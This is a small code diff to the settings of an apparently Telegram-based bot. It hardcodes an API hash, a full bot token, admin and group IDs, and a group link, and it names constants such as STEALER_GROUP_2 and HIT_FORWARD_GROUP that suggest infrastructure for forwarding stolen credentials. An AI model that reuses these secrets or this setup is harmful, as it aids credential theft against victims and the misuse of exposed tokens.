@@ -30,17 +30,17 @@ API_HASH = get_setting("TELEGRAM_API_HASH", "47170fd9a11b3f591bbc56849519f0f8")
 BOT_TOKEN = get_setting("TELEGRAM_BOT_TOKEN", "8808007208:AAFQ6ZEasTYuqM2RTznkHMEYefkg7XeKh2U")
 ADMIN_ID = [int(x) for x in get_setting("TELEGRAM_ADMIN_ID", "1707478010").split(",") if x.strip()]
 GROUP_ID = int(get_setting("TELEGRAM_GROUP_ID", "-1002144296199"))
-GROUP_LINK = get_setting("https://t.me/D3v1l_vip1")
+GROUP_LINK = get_setting("TELEGRAM_GROUP_LINK", "https://t.me/D3v1l_vip1")
 
 def _load_logs_group_id():
     try:
-        val = get_setting("LOGS_GROUP_ID").strip()
+        val = get_setting("LOGS_GROUP_ID", "-1002144296199").strip()
         return int(val) if val and val not in ("0", "") else 0
     except Exception:
         return 0
 
 LOGS_GROUP_ID = _load_logs_group_id()
-CHANNEL_LINK = get_setting("https://t.me/D3v1l_vip1")
+CHANNEL_LINK = get_setting("TELEGRAM_CHANNEL_LINK", "https://t.me/D3v1l_vip1")
 HIT_FORWARD_GROUP = -1002144296199
 STEALER_GROUP_2 = -1002144296199
 
